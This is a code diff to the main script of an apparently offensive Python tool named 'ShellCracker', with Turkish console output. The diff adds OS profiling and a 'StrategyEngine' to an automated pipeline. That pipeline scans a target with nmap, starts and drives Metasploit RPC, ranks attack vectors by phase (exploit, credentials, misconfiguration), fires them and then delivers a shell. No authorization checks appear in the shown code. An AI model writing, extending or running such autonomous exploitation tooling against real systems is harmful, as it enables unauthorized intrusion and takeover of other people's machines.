@@ -25,7 +25,8 @@ import yaml
 
 from core import colors as C
 from core import executor as execmod
-from core import matcher, recon, reporter
+from core import matcher, profiler, recon, reporter
+from core import strategy as strat
 
 LOG = logging.getLogger("ShellCracker")
 
@@ -266,11 +267,15 @@ def _launch_window_attach(msf_cfg: dict, sid: int) -> str | None:
     return None
 
 
-def _write_report(target, recon_result, matches, attempts, reports_dir) -> tuple[str, str]:
+def _write_report(
+    target, recon_result, matches, attempts, reports_dir, profile=None, plan=None
+) -> tuple[str, str]:
     """Build and write JSON + Markdown reports; return the two paths."""
     if recon_result is None:
         return "", ""
-    report = reporter.build_report(target, True, recon_result, matches, attempts)
+    report = reporter.build_report(
+        target, True, recon_result, matches, attempts, profile=profile, plan=plan
+    )
     return reporter.write_reports(report, reports_dir)
 
 
@@ -352,14 +357,21 @@ def main(argv: list[str] | None = None) -> int:
     recon_result = None
     matches: list = []
     attempts: list = []
+    profile = None
+    plan = None
 
     try:
         # --- 1. RECON -------------------------------------------------------
         _section("KESIF")
         recon_cfg = config.get("recon", {})
+        nmap_args = recon_cfg.get("nmap_arguments", "-sV -Pn")
+        if recon_cfg.get("os_detection") and "-O" not in nmap_args:
+            nmap_args += " -O"  # enables the profiler's OS-family guess (needs root)
+        if recon_cfg.get("default_scripts") and "-sC" not in nmap_args:
+            nmap_args += " -sC"
         recon_result = recon.run_recon(
             target=args.target,
-            nmap_arguments=recon_cfg.get("nmap_arguments", "-sV -Pn"),
+            nmap_arguments=nmap_args,
             timeout=int(recon_cfg.get("timeout", 300)),
             reports_dir=reports_dir,
             save_xml=args.rapor,
@@ -371,8 +383,19 @@ def main(argv: list[str] | None = None) -> int:
                 _write_report(args.target, recon_result, matches, attempts, reports_dir)
             return 0
 
-        # --- 2. CONNECT (auto-start msfrpcd if needed) + MATCH -------------
-        _section("ESLESTIRME")
+        # --- 2. PROFILE -----------------------------------------------------
+        _section("PROFIL")
+        profile = profiler.build_profile(recon_result, recon_result.os_matches)
+        print(
+            C.style("    OS tahmini: ", "bold")
+            + C.style(f"{profile.os_family}", "bold", "ok")
+            + C.dim(f"  (%{int(profile.os_confidence * 100)}, {profile.os_details})")
+        )
+        for cat in profile.categories():
+            ports = ", ".join(str(s.port) for s in profile.categorized[cat])
+            print(C.info(f"    • {cat:<10}") + C.dim(f" → port {ports}"))
+
+        # --- 3. CONNECT (auto-start msfrpcd if needed) ---------------------
         msf_cfg = config.get("msfrpc", {})
         LOG.info("Metasploit RPC'ye baglaniliyor (calismiyorsa otomatik baslatilir)...")
         client, msf_proc = execmod.connect_or_start(
@@ -385,30 +408,44 @@ def main(argv: list[str] | None = None) -> int:
         if msf_proc is not None:
             LOG.info("msfrpcd otomatik baslatildi (PID %s).", msf_proc.pid)
 
+        # Exploit-DB matches for the report (informational, non-fireable).
         matches = matcher.match_services(
             open_services,
-            msf_client=client,
+            msf_client=None,  # strategy already drives MSF search; avoid double work
             use_searchsploit=config.get("searchsploit", {}).get("enabled", True),
         )
-        candidates = matcher.flatten_candidates(matches)
-        if not candidates:
-            LOG.warning("Denenebilir Metasploit adayi bulunamadi.")
+
+        # --- 4. STRATEGY (the autonomous brain builds a scored plan) -------
+        _section("STRATEJI")
+        engine = strat.StrategyEngine(profile, client, config)
+        plan = engine.build()
+        if len(plan) == 0:
+            LOG.warning("Denenebilir saldiri vektoru uretilemedi.")
             if args.rapor:
-                _write_report(args.target, recon_result, matches, attempts, reports_dir)
+                _write_report(args.target, recon_result, matches, attempts,
+                              reports_dir, profile=profile, plan=plan)
             if msf_proc is not None:
                 _stop_proc(msf_proc)
             return 0
 
         print(
             C.style("[*] ", "info")
-            + C.style(str(len(candidates)), "bold", "info")
-            + C.info(" aday modul siraya alindi (en guvenilir once).")
+            + C.style(str(len(plan)), "bold", "info")
+            + C.info(" saldiri vektoru planlandi (faz sirasi: kesif → exploit → kimlik → misconfig).")
         )
+        for ph in strat.PHASES:
+            pend = plan.pending(ph)
+            if not pend:
+                continue
+            print(C.style(f"    [{ph}] ", "bold", "cyan") + C.dim(f"{len(pend)} vektor"))
+            for v in pend[:4]:
+                print(C.dim(f"      {v.score:5.0f}  {v.module_type}/{v.module}")
+                      + C.dim(f"  — {v.rationale}"))
 
-        # --- 3-5. DRY-RUN + FIRE + VERIFY ----------------------------------
+        # --- 5. EXECUTE (adaptive phase loop with feedback) ----------------
         _section("SOMURU")
         the_executor = execmod.Executor(client, args.target, config)
-        attempts = the_executor.run(candidates)
+        attempts = the_executor.run_plan(plan, engine)
 
         # --- 6. SHELL DELIVERY ---------------------------------------------
         success = next((a for a in attempts if getattr(a, "success", False)), None)
@@ -439,12 +476,14 @@ def main(argv: list[str] | None = None) -> int:
     except execmod.MsfConnectionError as exc:
         LOG.error("%s", exc)
         if args.rapor:
-            _write_report(args.target, recon_result, matches, attempts, reports_dir)
+            _write_report(args.target, recon_result, matches, attempts, reports_dir,
+                          profile=profile, plan=plan)
         return 3
     except Exception as exc:  # noqa: BLE001 - top-level guard
         LOG.exception("Beklenmeyen hata: %s", exc)
         if args.rapor:
-            _write_report(args.target, recon_result, matches, attempts, reports_dir)
+            _write_report(args.target, recon_result, matches, attempts, reports_dir,
+                          profile=profile, plan=plan)
         if msf_proc is not None:
             _stop_proc(msf_proc)
         return 1
@@ -454,7 +493,8 @@ def main(argv: list[str] | None = None) -> int:
     # Optional report (off by default).
     if args.rapor:
         json_path, md_path = _write_report(
-            args.target, recon_result, matches, attempts, reports_dir
+            args.target, recon_result, matches, attempts, reports_dir,
+            profile=profile, plan=plan
         )
         print(C.info(f"[*] JSON rapor: {json_path}"))
         print(C.info(f"[*] MD rapor:   {md_path}"))
